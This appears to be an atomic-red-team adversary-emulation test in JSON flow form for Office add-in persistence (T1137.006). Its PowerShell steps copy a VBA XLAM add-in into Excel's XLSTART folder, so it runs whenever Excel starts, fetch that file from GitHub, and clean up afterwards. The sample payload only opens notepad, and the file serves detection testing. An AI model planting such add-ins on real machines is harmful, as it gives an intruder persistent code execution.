{
  "id": "082141ed-b048-4c86-99c7-2b8da5b5bf48",
  "name": "Persistent Code Execution Via Excel VBA Add-in File (XLAM)",
  "description": "Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started\nThe sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "925ed31c-e333-4bb0-820a-a592fc2dc2c5",
      "type": "execute-command",
      "data": {
        "command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "c37e986e-ef53-4441-9d72-0a659c83ef25",
      "type": "execute-command",
      "data": {
        "command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "ac9c5d5a-40d7-4e6c-9bd0-c6d955ed4a1e",
      "name": "Check dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9f94da8b-ecff-48ab-933e-917a0106ec42",
      "name": "Resolve dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d17ec555-9059-4c24-a067-8c5645c2b3c6",
      "name": "Re-check dependency 1/2",
      "description": "Microsoft Excel must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3d5a75c5-e8fc-4e9f-8c9c-8a202214bd2a",
      "name": "Check dependency 2/2",
      "description": "XLAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b2a204e8-a8be-46c6-88e6-f26922bb37a1",
      "name": "Resolve dependency 2/2",
      "description": "XLAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "bda90d21-4f72-4186-9101-7119f02a66e4",
      "name": "Re-check dependency 2/2",
      "description": "XLAM file must exist on disk at specified location",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "925ed31c-e333-4bb0-820a-a592fc2dc2c5",
      "p": "on-success",
      "o": "c37e986e-ef53-4441-9d72-0a659c83ef25"
    },
    {
      "s": "925ed31c-e333-4bb0-820a-a592fc2dc2c5",
      "p": "on-failure",
      "o": "c37e986e-ef53-4441-9d72-0a659c83ef25"
    },
    {
      "s": "ac9c5d5a-40d7-4e6c-9bd0-c6d955ed4a1e",
      "p": "on-success",
      "o": "925ed31c-e333-4bb0-820a-a592fc2dc2c5"
    },
    {
      "s": "ac9c5d5a-40d7-4e6c-9bd0-c6d955ed4a1e",
      "p": "on-failure",
      "o": "9f94da8b-ecff-48ab-933e-917a0106ec42"
    },
    {
      "s": "9f94da8b-ecff-48ab-933e-917a0106ec42",
      "p": "on-success",
      "o": "d17ec555-9059-4c24-a067-8c5645c2b3c6"
    },
    {
      "s": "d17ec555-9059-4c24-a067-8c5645c2b3c6",
      "p": "on-failure",
      "o": "925ed31c-e333-4bb0-820a-a592fc2dc2c5"
    },
    {
      "s": "3d5a75c5-e8fc-4e9f-8c9c-8a202214bd2a",
      "p": "on-success",
      "o": "925ed31c-e333-4bb0-820a-a592fc2dc2c5"
    },
    {
      "s": "3d5a75c5-e8fc-4e9f-8c9c-8a202214bd2a",
      "p": "on-failure",
      "o": "b2a204e8-a8be-46c6-88e6-f26922bb37a1"
    },
    {
      "s": "b2a204e8-a8be-46c6-88e6-f26922bb37a1",
      "p": "on-success",
      "o": "bda90d21-4f72-4186-9101-7119f02a66e4"
    },
    {
      "s": "bda90d21-4f72-4186-9101-7119f02a66e4",
      "p": "on-failure",
      "o": "925ed31c-e333-4bb0-820a-a592fc2dc2c5"
    }
  ],
  "tags": [
    "T1137.006",
    "atomic-red-team"
  ]
}